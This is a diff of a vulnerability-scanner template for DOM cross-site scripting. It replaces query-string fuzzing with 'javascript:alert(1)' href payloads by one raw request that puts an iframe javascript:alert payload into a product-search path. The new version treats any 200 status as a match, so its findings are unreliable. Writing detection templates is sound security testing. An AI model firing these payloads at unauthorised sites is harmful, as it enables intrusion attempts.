@@ -1,40 +1,24 @@
-id: dom-xss
+id: dom_xss
 
 info:
-  name: DOM Cross Site Scripting
-  author: shelled
-  severity: medium
-  tags: xss,dom-xss
-
-variables:
-  first: 'javascript:alert(1)'
+  name: dom_xss
+  author: baothang
+  severity: low
+  description: basic dom xss attack
+  
+flow: |
+  http(1) 
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - raw:
+      - >
+        GET
+        /rest/products/search?q=<iframe+src%3d"javascript%3aalert(`xss`)">
+        HTTP/1.1
 
-    payloads:
-      reflection:
-        - 'href="javascript:alert(1)"'
-        - 'href=javascript:alert(1)'
-
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{reflection}}"
-
-    stop-at-first-match: true
-    matchers-condition: and
+        Host: {{Hostname}}
     matchers:
-      - type: word
-        part: body
-        words:
-          - "{{reflection}}"
+      - type: status
+        status:
+          - 200
 
-      - type: word
-        part: header
-        words:
-          - "text/html"
